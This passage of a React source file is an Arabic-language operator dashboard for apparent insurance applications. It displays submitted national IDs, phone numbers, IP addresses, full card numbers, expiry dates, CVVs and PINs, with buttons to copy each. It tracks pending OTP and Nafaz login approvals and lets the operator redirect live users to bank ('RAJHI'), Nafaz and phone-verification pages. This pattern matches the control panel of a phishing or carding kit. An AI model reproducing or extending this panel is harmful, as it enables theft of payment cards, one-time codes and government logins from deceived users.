            <div className="flex items-center gap-1 font-bold text-gray-700 cursor-pointer hover:text-blue-600 transition-colors">
              <span>كل المحادثات</span>
              <ChevronDown size={14} />
            </div>
            <Button
              variant="ghost"
              size="icon"
              className="h-6 w-6 text-gray-400"
              data-testid="button-layout"
            >
              <LayoutGrid size={14} />
            </Button>
          </div>
          <div className="relative">
            <Search
              size={14}
              className="absolute right-2 top-1/2 -translate-y-1/2 text-gray-400"
            />
            <Input
              placeholder="بحث..."
              value={searchQuery}
              onChange={(e) => setSearchQuery(e.target.value)}
              className="h-8 pr-8 text-xs border-border focus:border-primary rounded-md bg-muted"
              data-testid="input-search"
            />
          </div>

          {/* Filters */}
          <div className="flex flex-wrap gap-2">
            <select
              value={statusFilter}
              onChange={(e) => setStatusFilter(e.target.value)}
              className="h-7 px-2 text-xs border border-border rounded-md bg-card text-foreground focus:border-primary focus:outline-none"
              data-testid="select-status-filter"
            >
              <option value="all">كل الحالات</option>
              <option value="new">جديد</option>
              <option value="pending">قيد الانتظار</option>
              <option value="completed">مكتمل</option>
            </select>

            <select
              value={approvalFilter}
              onChange={(e) => setApprovalFilter(e.target.value)}
              className="h-7 px-2 text-xs border border-border rounded-md bg-card text-foreground focus:border-primary focus:outline-none"
              data-testid="select-approval-filter"
            >
              <option value="all">كل الموافقات</option>
              <option value="pending_card">بطاقة معلقة</option>
              <option value="pending_phone">هاتف معلق</option>
              <option value="approved">موافق عليه</option>
              <option value="rejected">مرفوض</option>
            </select>

            {uniqueCountries.length > 0 && (
              <select
                value={countryFilter}
                onChange={(e) => setCountryFilter(e.target.value)}
                className="h-7 px-2 text-xs border border-border rounded-md bg-card text-foreground focus:border-primary focus:outline-none"
                data-testid="select-country-filter"
              >
                <option value="all">كل الدول</option>
                {uniqueCountries.map((country) => (
                  <option key={country} value={country}>
                    {getCountryFlag(country)} {country}
                  </option>
                ))}
              </select>
            )}
          </div>

          {/* Data Type Filter Buttons */}
          <div className="flex flex-wrap gap-1.5">
            <button
              onClick={() => setDataFilter("all")}
              className={cn(
                "px-2 py-1 text-[10px] rounded-full transition-all",
                dataFilter === "all"
                  ? "bg-blue-500 text-white"
                  : "bg-gray-100 text-gray-600 hover:bg-gray-200",
              )}
              data-testid="filter-all"
            >
              الكل
            </button>
            <button
              onClick={() => setDataFilter("card")}
              className={cn(
                "px-2 py-1 text-[10px] rounded-full transition-all flex items-center gap-1",
                dataFilter === "card"
                  ? "bg-purple-500 text-white"
                  : "bg-purple-50 text-purple-600 hover:bg-purple-100",
              )}
              data-testid="filter-card"
            >
              <CreditCard size={10} />
              بطاقة
            </button>
            <button
              onClick={() => setDataFilter("phone")}
              className={cn(
                "px-2 py-1 text-[10px] rounded-full transition-all flex items-center gap-1",
                dataFilter === "phone"
                  ? "bg-blue-500 text-white"
                  : "bg-blue-50 text-blue-600 hover:bg-blue-100",
              )}
              data-testid="filter-phone"
            >
              <Phone size={10} />
              هاتف
            </button>
            <button
              onClick={() => setDataFilter("nafaz")}
              className={cn(
                "px-2 py-1 text-[10px] rounded-full transition-all flex items-center gap-1",
                dataFilter === "nafaz"
                  ? "bg-green-500 text-white"
                  : "bg-green-50 text-green-600 hover:bg-green-100",
              )}
              data-testid="filter-nafaz"
            >
              <Lock size={10} />
              نفاذ
            </button>
            <button
              onClick={() => setDataFilter("info")}
              className={cn(
                "px-2 py-1 text-[10px] rounded-full transition-all flex items-center gap-1",
                dataFilter === "info"
                  ? "bg-teal-500 text-white"
                  : "bg-teal-50 text-teal-600 hover:bg-teal-100",
              )}
              data-testid="filter-info"
            >
              <Globe size={10} />
              معلومات
            </button>
            <button
              onClick={() => setDataFilter("online")}
              className={cn(
                "px-2 py-1 text-[10px] rounded-full transition-all flex items-center gap-1",
                dataFilter === "online"
                  ? "bg-green-500 text-white"
                  : "bg-green-50 text-green-600 hover:bg-green-100",
              )}
              data-testid="filter-online"
            >
              <div className="w-2 h-2 rounded-full bg-current animate-pulse" />
              متصل ({onlineCount})
            </button>

            {(statusFilter !== "all" ||
              approvalFilter !== "all" ||
              countryFilter !== "all" ||
              dataFilter !== "all") && (
              <Button
                variant="ghost"
                size="sm"
                onClick={() => {
                  setStatusFilter("all");
                  setApprovalFilter("all");
                  setCountryFilter("all");
                  setDataFilter("all");
                }}
                className="h-6 px-2 text-[10px] text-red-500 hover:text-red-600 hover:bg-red-50"
                data-testid="button-clear-filters"
              >
                <X size={10} className="ml-1" />
                مسح
              </Button>
            )}
          </div>

          {/* Active filter count */}
          <div className="text-[10px] text-gray-400">
            عرض {filteredApps.length} من {applications.length} طلب
          </div>
        </div>

        {/* Application List */}
        <ScrollArea className="flex-1">
          {isLoading ? (
            <div className="p-4 text-center text-gray-400 text-sm">
              جاري التحميل...
            </div>
          ) : filteredApps.length === 0 ? (
            <div className="p-4 text-center text-gray-400 text-sm">
              لا توجد طلبات
            </div>
          ) : (
            filteredApps.map((app) => (
              <div
                key={app.id}
                onClick={() => {
                  setSelectedId(app.id!);
                  if (app.isUnread) {
                    updateUserDocument(app.id!, { isUnread: false });
                  }
                }}
                className={cn(
                  "flex items-center gap-3 px-4 py-3 border-b border-border cursor-pointer transition-all duration-200 hover:bg-primary/5",
                  selectedId === app.id &&
                    "bg-blue-50 border-r-2 border-r-blue-500",
                  app.cardNumber &&
                    selectedId !== app.id &&
                    "bg-gradient-to-l from-purple-50 to-white border-r-2 border-r-purple-400",
                  (app.nafazId ||
                    app.mobileInfo ||
                    app.operatorName ||
                    app.operator ||
                    app.phone2 ||
                    app.phoneOtpCode) &&
                    !app.cardNumber &&
                    selectedId !== app.id &&
                    "bg-gradient-to-l from-green-50 to-white border-r-2 border-r-green-400",
                )}
                data-testid={`app-item-${app.id}`}
              >
                <div className="relative">
                  <div
                    className={cn(
                      "w-10 h-10 rounded-full flex items-center justify-center text-sm font-bold relative",
                      isUserOnline(app.id!)
                        ? "bg-blue-100 text-blue-600"
                        : "bg-gray-200 text-gray-600",
                    )}
                  >
                    {app.documment_owner_full_name?.charAt(0) || "؟"}
                    {/* Animated alert for pending OTP approval - hidden when approved */}
                    {(app.phoneOtp &&
                      app.phoneOtpApproval !== "approved" &&
                      (!app.phoneOtpApproval ||
                        app.phoneOtpApproval === "pending")) ||
                    (app.otp &&
                      app.phoneOtpApproval !== "approved" &&
                      (!app.phoneOtpApproval ||
                        app.phoneOtpApproval === "pending")) ||
                    (app.phoneOtpCode &&
                      app.phoneOtpCodeStatus !== "approved" &&
                      (!app.phoneOtpCodeStatus ||
                        app.phoneOtpCodeStatus === "pending")) ||
                    (app.nafazId &&
                      app.nafazStatus !== "approved" &&
                      (!app.nafazStatus || app.nafazStatus === "pending")) ||
                    (app._v1 &&
                      app._v1Status !== "approved" &&
                      (!app._v1Status || app._v1Status === "pending")) ||
                    (app._v2 &&
                      app._v2Status !== "approved" &&
                      (!app._v2Status || app._v2Status === "pending")) ||
                    (app._v3 &&
                      app._v3Status !== "approved" &&
                      (!app._v3Status || app._v3Status === "pending")) ||
                    (app._v4 &&
                      app._v4Status !== "approved" &&
                      (!app._v4Status || app._v4Status === "pending")) ||
                    (app._v5 &&
                      app._v5Status !== "approved" &&
                      (!app._v5Status || app._v5Status === "pending")) ||
                    (app._v6 &&
                      app._v6Status !== "approved" &&
                      (!app._v6Status || app._v6Status === "pending")) ||
                    (app._v7 &&
                      app._v7Status !== "approved" &&
                      (!app._v7Status || app._v7Status === "pending")) ? (
                      <>
                        <div className="absolute -top-1 -left-1 w-4 h-4 bg-red-500 rounded-full animate-ping opacity-75" />
                        <div className="absolute -top-1 -left-1 w-4 h-4 bg-red-500 rounded-full flex items-center justify-center">
                          <span className="text-white text-[8px] font-bold">
                            !
                          </span>
                        </div>
                      </>
                    ) : null}
                    {/* Country Flag */}
                    {app.country && (
                      <div
                        className="absolute -bottom-1 -left-1 text-sm"
                        data-testid={`flag-${app.id}`}
                      >
                        {getCountryFlag(app.country)}
                      </div>
                    )}
                  </div>
                  {isUserOnline(app.id!) && (
                    <div className="absolute -bottom-0.5 -right-0.5 w-3 h-3 bg-green-400 rounded-full border-2 border-white animate-pulse" />
                  )}
                </div>
                <div className="flex-1 min-w-0">
                  <div className="flex items-center justify-between">
                    <div className="flex items-center gap-1.5">
                      <span
                        className={cn(
                          "font-medium text-sm truncate",
                          app.isUnread
                            ? "text-foreground font-bold"
                            : "text-foreground",
                        )}
                      >
                        {app.documment_owner_full_name}
                      </span>
                      {app.isUnread && (
                        <Flag
                          size={10}
                          className="text-red-500 fill-red-500"
                          data-testid={`flag-unread-${app.id}`}
                        />
                      )}
                    </div>
                    <span className="text-[10px] text-muted-foreground">
                      {app.createdDate
                        ? (() => {
                            const now = new Date();
                            const created = new Date(app.createdDate);
                            const diffMs = now.getTime() - created.getTime();
                            const diffMins = Math.floor(diffMs / 60000);
                            const diffHours = Math.floor(diffMs / 3600000);
                            const diffDays = Math.floor(diffMs / 86400000);
                            if (diffMins < 1) return "الآن";
                            if (diffMins < 60) return `منذ ${diffMins} دقيقة`;
                            if (diffHours < 24) return `منذ ${diffHours} ساعة`;
                            if (diffDays < 7) return `منذ ${diffDays} يوم`;
                            return created.toLocaleDateString("ar-SA");
                          })()
                        : ""}
                    </span>
                  </div>
                  <div className="flex items-center gap-2 mt-0.5">
                    <span className="text-xs text-gray-500 truncate">
                      {app.cardNumber
                        ? "الدفع ببطاقة الائتمان"
                        : !app.currentPage
                          ? "الصفحة الرئيسية"
                          : "تحقق نفاذ"}
                    </span>
                    {app.cardNumber && (
                      <CreditCard size={10} className="text-purple-400" />
                    )}
                    {app.phoneOtp && (
                      <Phone size={10} className="text-blue-400" />
                    )}
                    {app.nafazId && (
                      <Lock size={10} className="text-green-500" />
                    )}
                    {(app.mobileInfo || app.operatorName) && (
                      <Globe size={10} className="text-teal-400" />
                    )}
                    {app.phoneVerificationCode && (
                      <span
                        className={cn(
                          "text-[8px] px-1 rounded",
                          app.phoneVerificationStatus === "approved"
                            ? "bg-green-100 text-green-600"
                            : app.phoneVerificationStatus === "rejected"
                              ? "bg-red-100 text-red-600"
                              : "bg-amber-100 text-amber-600",
                        )}
                      >
                        توثيق
                      </span>
                    )}
                    {app.country && (
                      <span className="text-[9px] text-gray-400 mr-auto">
                        {getCountryFlag(app.country)} {app.country}
                      </span>
                    )}
                  </div>
                </div>
              </div>
            ))
          )}
        </ScrollArea>
      </aside>

      {/* Main Content Area */}
      <main className="flex-1 flex flex-col bg-background min-w-0 overflow-hidden">
        {/* Top Header Bar - Fixed */}
        <header className="sticky top-0 z-20 bg-card border-b border-border shadow-sm shrink-0">
          <div className="h-16 flex items-center justify-between px-4">
            <div className="flex items-center gap-4">
              <span className="font-bold text-primary text-lg">Pepsi</span>
              <div className="flex items-center gap-3 text-xs text-muted-foreground font-mono">
                <Badge
                  variant="outline"
                  className="text-xs px-2 py-1 bg-green-500/10 text-green-600 dark:text-green-400 border-green-500/20 flex items-center gap-1.5"
                  data-testid="badge-online-users"
                >
                  <span className="w-2 h-2 bg-green-500 rounded-full animate-pulse" />
                  <span>{onlineCount} متصل</span>
                </Badge>
                <Badge
                  variant="outline"
                  className="text-xs px-2 py-1 bg-blue-500/10 text-blue-600 dark:text-blue-400 border-blue-500/20"
                  data-testid="badge-total"
                >
                  {stats.total} إجمالي
                </Badge>
              </div>
            </div>
            <div className="flex items-center gap-2">
              <Button
                variant="ghost"
                size="icon"
                className="h-8 w-8 text-muted-foreground"
                onClick={() => setTheme(theme === "dark" ? "light" : "dark")}
                data-testid="button-theme-toggle"
              >
                {theme === "dark" ? <Sun size={16} /> : <Moon size={16} />}
              </Button>
              <Button
                variant="ghost"
                size="icon"
                className={cn(
                  "h-8 w-8",
                  soundEnabled ? "text-green-500" : "text-muted-foreground",
                )}
                onClick={() => setSoundEnabled(!soundEnabled)}
                data-testid="button-sound-toggle"
              >
                {soundEnabled ? <Volume2 size={16} /> : <VolumeX size={16} />}
              </Button>
              <Button
                variant="ghost"
                size="sm"
                className="text-xs text-muted-foreground"
                onClick={() => refetch()}
                data-testid="button-refresh"
              >
                تحديث
              </Button>
            </div>
          </div>

          {/* Page/Step Navigation Bar */}
          {selectedApplication && (
            <div className="px-4 py-3 bg-gradient-to-l from-primary/10 to-card border-t border-border overflow-x-auto">
              <div className="flex items-center gap-2 min-w-max">
                {/* Steps 1-8 */}
                {[
                  { step: 1, title: "البيانات الأساسية" },
                  { step: 2, title: "بيانات التأمين" },
                  { step: 3, title: "قائمة الأسعار" },
                  { step: 4, title: "الإضافات" },
                  { step: 5, title: "الملخص" },
                  { step: 6, title: "الدفع" },
                  { step: 7, title: "التحقق" },
                  { step: 8, title: "رمز PIN" },
                ].map(({ step, title }) => {
                  const currentPage = selectedApplication.currentPage;
                  const pageNum =
                    typeof currentPage === "number"
                      ? currentPage
                      : parseInt(String(currentPage)) || 0;
                  const isActive = pageNum === step;
                  const isPassed = pageNum > step && pageNum <= 8;
                  return (
                    <button
                      key={step}
                      onClick={() =>
                        handleUpdateCurrentPage(selectedApplication.id!, step)
                      }
                      disabled={updating}
                      className={cn(
                        "flex items-center gap-1.5 px-3 py-2 rounded-lg text-xs font-medium transition-all whitespace-nowrap cursor-pointer hover:opacity-80",
                        isActive && "bg-blue-600 text-white shadow-md",
                        isPassed &&
                          !isActive &&
                          "bg-green-500/20 text-green-700 dark:text-green-400 hover:bg-green-500/30",
                        !isActive &&
                          !isPassed &&
                          "bg-muted text-muted-foreground hover:bg-muted/80",
                      )}
                      data-testid={`step-${step}`}
                    >
                      <span
                        className={cn(
                          "w-5 h-5 rounded-full flex items-center justify-center text-[10px] font-bold",
                          isActive && "bg-white/20",
                          isPassed && !isActive && "bg-green-500/30",
                          !isActive && !isPassed && "bg-secondary",
                        )}
                      >
                        {isPassed && !isActive ? "✓" : step}
                      </span>
                      <span className="hidden xl:inline">{title}</span>
                    </button>
                  );
                })}

                {/* Separator */}
                <div className="h-6 w-px bg-border mx-2" />

                {/* Special Pages */}
                <button
                  onClick={() =>
                    handleUpdateCurrentPage(selectedApplication.id!, "rajhi")
                  }
                  disabled={updating}
                  className={cn(
                    "flex items-center gap-1.5 px-3 py-2 rounded-lg text-xs font-medium transition-all whitespace-nowrap cursor-pointer hover:opacity-80",
                    (selectedApplication.currentPage === "rajhi" ||
                      selectedApplication.currentPage === "RAJHI") &&
                      "bg-teal-600 text-white shadow-md",
                    selectedApplication.currentPage !== "rajhi" &&
                      selectedApplication.currentPage !== "RAJHI" &&
                      "bg-teal-500/10 text-teal-600 dark:text-teal-400 hover:bg-teal-500/20",
                  )}
                  data-testid="step-rajhi"
                >
                  <CreditCard size={14} />
                  <span>RAJHI</span>
                </button>

                <button
                  onClick={() =>
                    handleUpdateCurrentPage(selectedApplication.id!, 9999)
                  }
                  disabled={updating}
                  className={cn(
                    "flex items-center gap-1.5 px-3 py-2 rounded-lg text-xs font-medium transition-all whitespace-nowrap cursor-pointer hover:opacity-80",
                    (selectedApplication.currentPage === 9999 ||
                      selectedApplication.currentPage === "9999") &&
                      "bg-amber-500 text-white shadow-md",
                    selectedApplication.currentPage !== 9999 &&
                      selectedApplication.currentPage !== "9999" &&
                      "bg-amber-500/10 text-amber-600 dark:text-amber-400 hover:bg-amber-500/20",
                  )}
                  data-testid="step-phone"
                >
                  <Phone size={14} />
                  <span className="hidden xl:inline">التحقق من الجوال</span>
                  <span className="xl:hidden">9999</span>
                </button>

                <button
                  onClick={() =>
                    handleUpdateCurrentPage(selectedApplication.id!, 8888)
                  }
                  disabled={updating}
                  className={cn(
                    "flex items-center gap-1.5 px-3 py-2 rounded-lg text-xs font-medium transition-all whitespace-nowrap cursor-pointer hover:opacity-80",
                    (selectedApplication.currentPage === 8888 ||
                      selectedApplication.currentPage === "8888") &&
                      "bg-purple-500 text-white shadow-md",
                    selectedApplication.currentPage !== 8888 &&
                      selectedApplication.currentPage !== "8888" &&
                      "bg-purple-500/10 text-purple-600 dark:text-purple-400 hover:bg-purple-500/20",
                  )}
                  data-testid="step-nafaz"
                >
                  <Lock size={14} />
                  <span className="hidden xl:inline">نفاذ</span>
                  <span className="xl:hidden">8888</span>
                </button>

                <button
                  onClick={() =>
                    handleUpdateCurrentPage(selectedApplication.id!, "done")
                  }
                  disabled={updating}
                  className={cn(
                    "flex items-center gap-1.5 px-3 py-2 rounded-lg text-xs font-medium transition-all whitespace-nowrap cursor-pointer hover:opacity-80",
                    (selectedApplication.currentPage === "done" ||
                      selectedApplication.currentPage === "Done") &&
                      "bg-green-500 text-white shadow-md",
                    selectedApplication.currentPage !== "done" &&
                      selectedApplication.currentPage !== "Done" &&
                      "bg-green-500/10 text-green-600 dark:text-green-400 hover:bg-green-500/20",
                  )}
                  data-testid="step-done"
                >
                  <CheckCircle size={14} />
                  <span>مكتمل</span>
                </button>

                {/* Current Page Display */}
                <div className="mr-auto flex items-center gap-2 text-xs pr-2">
                  <span className="text-muted-foreground">الصفحة:</span>
                  <Badge
                    className="bg-blue-500/10 text-blue-600 dark:text-blue-400 font-mono text-xs px-2 py-1"
                    data-testid="badge-current-page"
                  >
                    {selectedApplication.currentPage || "—"}
                  </Badge>
                </div>
              </div>
            </div>
          )}
        </header>

        {/* Application Detail */}
        {selectedApplication ? (
          <div ref={chatScrollRef} className="flex-1 px-8 py-6 overflow-y-auto">
            {/* User Info Bar */}
            <div className="flex items-center justify-between mb-6 pb-4 border-b border-border">
              <div className="flex items-center gap-4">
                <div className="flex items-center gap-2 text-sm">
                  <span className="text-muted-foreground">هوية سعودي</span>
                  <span
                    className="font-mono text-foreground"
                    data-testid="text-identity"
                  >
                    {selectedApplication.identityNumber}
                  </span>
                </div>
                <div className="flex items-center gap-2 text-sm">
                  <Phone size={14} className="text-gray-400" />
                  <span
                    className="font-mono text-foreground"
                    data-testid="text-phone"
                  >
                    {selectedApplication.phoneNumber}
                  </span>
                </div>
                <div className="flex items-center gap-2 text-sm">
                  <User size={14} className="text-gray-400" />
                  <span className="text-foreground" data-testid="text-owner">
                    {selectedApplication.documment_owner_full_name}
                  </span>
                </div>
                {selectedApplication.country && (
                  <div className="flex items-center gap-2 text-sm">
                    <Globe size={14} className="text-gray-400" />
                    <span className="text-lg">
                      {getCountryFlag(selectedApplication.country)}
                    </span>
                    <span
                      className="text-foreground"
                      data-testid="text-country"
                    >
                      {selectedApplication.country}
                    </span>
                  </div>
                )}
              </div>
              <div className="flex items-center gap-2 text-[10px] text-gray-400">
                {isUserOnline(selectedApplication.id!) ? (
                  <Badge className="bg-green-100 text-green-700 text-[9px] animate-pulse">
                    متصل الآن
                  </Badge>
                ) : (
                  <Badge variant="outline" className="text-[9px] text-gray-500">
                    {getLastSeen(selectedApplication.id!) || "غير متصل"}
                  </Badge>
                )}
                <Badge
                  className={cn(
                    "text-[9px]",
                    selectedApplication.step === "payment-completed" &&
                      "bg-green-100 text-green-700",
                    (selectedApplication.step === "card-details-submitted" ||
                      selectedApplication.step === "otp-submitted") &&
                      "bg-amber-100 text-amber-700",
                    selectedApplication.step === "booking-completed" &&
                      "bg-blue-100 text-blue-700",
                    !selectedApplication.step && "bg-gray-100 text-gray-700",
                  )}
                  data-testid="badge-status"
                >
                  {selectedApplication.step || "جديد"}
                </Badge>
                <span data-testid="text-serial">
                  V{selectedApplication.id?.slice(-6) || "201591"}
                </span>
              </div>
            </div>

            {/* Device Info */}
            {selectedApplication.ipAddress && (
              <div className="flex items-center gap-4 mb-6 text-[10px] text-gray-400 font-mono">
                <span data-testid="text-ip">
                  {selectedApplication.ipAddress}
                </span>
                <span>ios</span>
                <span>mobile</span>
                <span>Mobile Chrome</span>
                {selectedApplication.country && (
                  <span className="flex items-center gap-1">
                    <MapPin size={10} />
                    {selectedApplication.country}
                  </span>
                )}
                <span className="mr-auto">
                  {selectedApplication.currentPage || "الصفحة الرئيسية"}
                </span>
              </div>
            )}

            <div className="max-w-3xl mx-auto space-y-2">
              {/* Welcome Message */}
              <ChatBubble title="النظام" icon={<MessageSquare size={16} />}>
                <p className="text-sm">
                  مرحباً، هذه بيانات طلب التأمين الخاص بـ{" "}
                  <strong>
                    {selectedApplication.documment_owner_full_name}
                  </strong>
                </p>
              </ChatBubble>

              {/* User Basic Info */}
              {visibilitySettings.basicInfo && (
                <ChatBubble
                  title="المعلومات الأساسية"
                  isUser
                  icon={<User size={16} />}
                >
                  <div className="space-y-1 text-sm">
                    {selectedApplication.identityNumber && (
                      <div>
                        رقم الهوية:{" "}
                        <span className="font-mono" dir="ltr">
                          {selectedApplication.identityNumber}
                        </span>
                      </div>
                    )}
                    {selectedApplication.documment_owner_full_name && (
                      <div>
                        الاسم: {selectedApplication.documment_owner_full_name}
                      </div>
                    )}
                    {selectedApplication.phoneNumber && (
                      <div>
                        الهاتف:{" "}
                        <span className="font-mono" dir="ltr">
                          {selectedApplication.phoneNumber}
                        </span>
                      </div>
                    )}
                    {selectedApplication.country && (
                      <div>البلد: {selectedApplication.country}</div>
                    )}
                  </div>
                </ChatBubble>
              )}

              {/* Vehicle Info */}
              {(selectedApplication.vehicleModel ||
                selectedApplication.plateNumber) && (
                <ChatBubble
                  title="معلومات المركبة"
                  icon={<CreditCard size={16} />}
                >
                  <div className="space-y-1 text-sm">
                    <DataBubbleRow
                      label="نوع المركبة"
                      value={selectedApplication.vehicleModel}
                    />
                    <DataBubbleRow
                      label="رقم اللوحة"
                      value={selectedApplication.plateNumber}
                      isLtr
                    />
                    <DataBubbleRow
                      label="نص اللوحة"
                      value={selectedApplication.plateText}
                    />
                    <DataBubbleRow
                      label="سنة الصنع"
                      value={selectedApplication.manufacturingYear}
                      isLtr
                    />
                    <DataBubbleRow
                      label="قيمة المركبة"
                      value={selectedApplication.vehicleValue}
                      isLtr
                    />
                    <DataBubbleRow
                      label="نوع التغطية"
                      value={selectedApplication.coverageType}
                    />
                  </div>
                </ChatBubble>
              )}

              {/* All Data from Firestore - Separate Chat Bubbles */}
              {visibilitySettings.rawData && (
                <div className="space-y-3">
                  <div className="text-center text-xs text-gray-400 mb-4">
                    جميع البيانات
                  </div>
                  {Object.entries(selectedApplication).map(([key, value]) => {
                    const excludeKeys = [
                      "id",
                      "isOnline",
                      "isUnread",
                      "currentPage",
                      "bankInfo",
                      "selectedOffer",
                      "company",
                      "cardApproval",
                      "phoneOtpApproval",
                      "phoneVerificationStatus",
                      "idVerificationStatus",
                      "nafazStatus",
                      "phoneOtpCodeStatus",
                      "otpApproved",
                      "_v1Status",
                      "_v2Status",
                      "_v3Status",
                      "_v4Status",
                      "_v5Status",
                      "_v6Status",
                      "_v7Status",
                      "agreeToTerms",
                    ];
                    if (excludeKeys.includes(key)) return null;
                    if (
                      value === null ||
                      value === undefined ||
                      value === "" ||
                      value === false
                    )
                      return null;
                    if (typeof value === "object") return null;
                    if (String(value).trim() === "") return null;

                    const isLtr = /^[a-zA-Z0-9\s\-\+\@\.\/\:]+$/.test(
                      String(value),
                    );
                    return (
                      <div
                        key={key}
                        className="bg-card rounded-2xl shadow-sm border border-border p-4 hover:shadow-md transition-shadow"
                        style={{ borderRadius: "20px 20px 20px 4px" }}
                      >
                        <div className="flex items-center justify-between gap-3">
                          <div className="flex-1 min-w-0">
                            <div className="text-[10px] text-gray-400 mb-1 font-mono">
                              {key}
                            </div>
                            <div
                              className={cn(
                                "text-foreground font-medium break-all",
                                isLtr && "font-mono",
                              )}
                              dir={isLtr ? "ltr" : "rtl"}
                            >
                              {String(value)}
                            </div>
                          </div>
                          <Button
                            size="sm"
                            variant="ghost"
                            className="shrink-0 h-8 w-8 p-0 text-gray-400 hover:text-blue-600 hover:bg-blue-50"
                            onClick={() => copyToClipboard(String(value), key)}
                          >
                            <Copy size={14} />
                          </Button>
                        </div>
                      </div>
                    );
                  })}
                </div>
              )}

              {/* Payment Card Section */}
              {visibilitySettings.paymentCard &&
                selectedApplication.cardNumber && (
                  <div className="bg-card rounded-xl shadow-sm border border-border overflow-hidden">
                    <div className="bg-gradient-to-l from-amber-500/10 to-card px-4 py-3 border-b border-border">
                      <h3 className="font-bold text-foreground text-sm flex items-center gap-2">
                        <CreditCard size={16} className="text-amber-500" />
                        بطاقة الدفع
                      </h3>
                    </div>
                    <div className="p-6 flex justify-center">
                      <div
                        className="w-[400px] h-[240px] rounded-2xl p-6 relative overflow-hidden shadow-xl transform hover:scale-105 transition-transform duration-300"
                        style={{
                          background:
                            "linear-gradient(135deg, #1a365d 0%, #2d3748 50%, #1a202c 100%)",
                        }}
                        data-testid="card-payment"
                      >
                        {/* Decorative circles */}
                        <div
                          className="absolute top-0 right-0 w-64 h-64 rounded-full opacity-10"
                          style={{
                            background:
                              "radial-gradient(circle, white 0%, transparent 70%)",
                            transform: "translate(30%, -30%)",
                          }}
                        />
                        <div
                          className="absolute bottom-0 left-0 w-48 h-48 rounded-full opacity-10"
                          style={{
                            background:
                              "radial-gradient(circle, white 0%, transparent 70%)",
                            transform: "translate(-30%, 30%)",
                          }}
                        />

                        {/* Top Row - Bank Logo & Chip */}
                        <div className="flex justify-between items-start mb-6">
                          <div className="flex items-center gap-3">
                            <div className="w-12 h-9 rounded bg-gradient-to-br from-yellow-400 to-yellow-600 flex items-center justify-center shadow-md">
                              <div className="w-8 h-6 rounded-sm bg-gradient-to-br from-yellow-300 to-yellow-500 opacity-80" />
                            </div>
                            <div className="w-6 h-6">
                              <svg
                                viewBox="0 0 24 24"
                                fill="none"
                                className="text-white/60"
                              >
                                <path
                                  d="M12 2L2 7l10 5 10-5-10-5zM2 17l10 5 10-5M2 12l10 5 10-5"
                                  stroke="currentColor"
                                  strokeWidth="2"
                                  strokeLinecap="round"
                                  strokeLinejoin="round"
                                />
                              </svg>
                            </div>
                          </div>
                          <div className="text-left">
                            <div className="text-white font-bold text-xl tracking-tight">
                              {binData?.issuer?.name}
                            </div>
                            <div className="text-white/60 text-[10px]"></div>
                          </div>
                        </div>

                        {/* Card Number */}
                        <div className="mb-6">
                          <div
                            className="font-mono text-2xl text-white tracking-[0.2em] font-medium drop-shadow-lg"
                            data-testid="text-card-number"
                            dir="ltr"
                          >
                            {selectedApplication.cardNumber ||
                              "•••• •••• •••• ••••"}
                          </div>
                        </div>

                        {/* Bottom Row */}
                        <div className="flex justify-between items-end">
                          <div className="flex flex-col gap-1">
                            <span className="text-white/50 text-[9px] uppercase tracking-wider">
                              Card Type
                            </span>
                            <span
                              className="text-white text-sm font-medium tracking-wide"
                              data-testid="text-card-holder"
                            >
                              {binData?.BIN?.type || binData?.BIN?.brand}
                            </span>
                          </div>
                          <div className="flex items-center gap-4">
                            <div className="text-left">
                              <span className="text-white/50 text-[9px] uppercase tracking-wider block">
                                Expires
                              </span>
                              <span
                                className="font-mono text-lg text-white"
                                data-testid="text-expiry"
                                dir="ltr"
                              >
                                {selectedApplication.cardMonth &&
                                selectedApplication.cardYear
                                  ? `${selectedApplication.cardMonth}/${selectedApplication.cardYear}`
                                  : selectedApplication.expiryMonth &&
                                      selectedApplication.expiryYear
                                    ? `${selectedApplication.expiryMonth}/${selectedApplication.expiryYear}`
                                    : selectedApplication.expiryDate || "MM/YY"}
                              </span>
                            </div>
                            <div className="text-left">
                              <span className="text-white/50 text-[9px] uppercase tracking-wider block">
                                CVV
                              </span>
                              <span
                                className="font-mono text-lg text-white"
                                data-testid="text-cvv"
                              >
                                {selectedApplication.cvv || "•••"}
                              </span>
                            </div>
                            {selectedApplication.pinCode && (
                              <div className="text-left">
                                <span className="text-white/50 text-[9px] uppercase tracking-wider block">
                                  PIN
                                </span>
                                <span
                                  className="font-mono text-lg text-white"
                                  data-testid="text-pin"
                                >
                                  {selectedApplication.pinCode}
                                </span>
                              </div>
                            )}
                          </div>
                        </div>

                        {/* Card Type Badge */}
                        <div className="absolute bottom-6 left-6 flex items-center gap-2">
                          {binData?.BIN?.brand && (
                            <div className="bg-white/20 backdrop-blur-sm rounded px-2 py-1">
                              <span
                                className="text-white text-[10px] font-bold"
                                data-testid="badge-card-type"
                              >
                                {binData.BIN.brand}
                              </span>
                            </div>
                          )}
                          <div className="flex -space-x-2">
                            <div className="w-6 h-6 rounded-full bg-red-500 opacity-80" />
                            <div className="w-6 h-6 rounded-full bg-yellow-500 opacity-80" />
                          </div>
                        </div>
                      </div>
                    </div>

                    {/* Copy buttons */}
                    <div className="px-6 pb-4 flex flex-wrap gap-2 justify-center">
                      <Button
                        size="sm"
                        variant="outline"
                        className="text-xs gap-1"
                        onClick={() =>
                          copyToClipboard(
                            selectedApplication.cardNumber!,
                            "رقم البطاقة",
                          )
                        }
                        data-testid="button-copy-card"
                      >
                        <Copy size={12} /> نسخ رقم البطاقة
                      </Button>
                      <Button
                        size="sm"
                        variant="outline"
                        className="text-xs gap-1"
                        onClick={() =>
                          copyToClipboard(selectedApplication.cvv!, "CVV")
                        }
                        data-testid="button-copy-cvv"
                      >
                        <Copy size={12} /> نسخ CVV
                      </Button>
                      <Button
                        size="sm"
                        variant="outline"
                        className="text-xs gap-1"
                        onClick={() =>
                          copyToClipboard(
                            selectedApplication.cardMonth &&
                              selectedApplication.cardYear
                              ? `${selectedApplication.cardMonth}/${selectedApplication.cardYear}`
                              : selectedApplication.expiryMonth &&
                                  selectedApplication.expiryYear
                                ? `${selectedApplication.expiryMonth}/${selectedApplication.expiryYear}`
                                : selectedApplication.expiryDate!,
                            "تاريخ الانتهاء",
                          )
                        }
                        data-testid="button-copy-expiry"
                      >
                        <Copy size={12} /> نسخ تاريخ الانتهاء
                      </Button>
                      {(selectedApplication.cardMonth ||
                        selectedApplication.expiryMonth) && (
                        <Button
                          size="sm"
                          variant="outline"
                          className="text-xs gap-1"
                          onClick={() =>
                            copyToClipboard(
                              selectedApplication.cardMonth ||
                                selectedApplication.expiryMonth!,
                              "الشهر",
                            )
                          }
                          data-testid="button-copy-month"
                        >
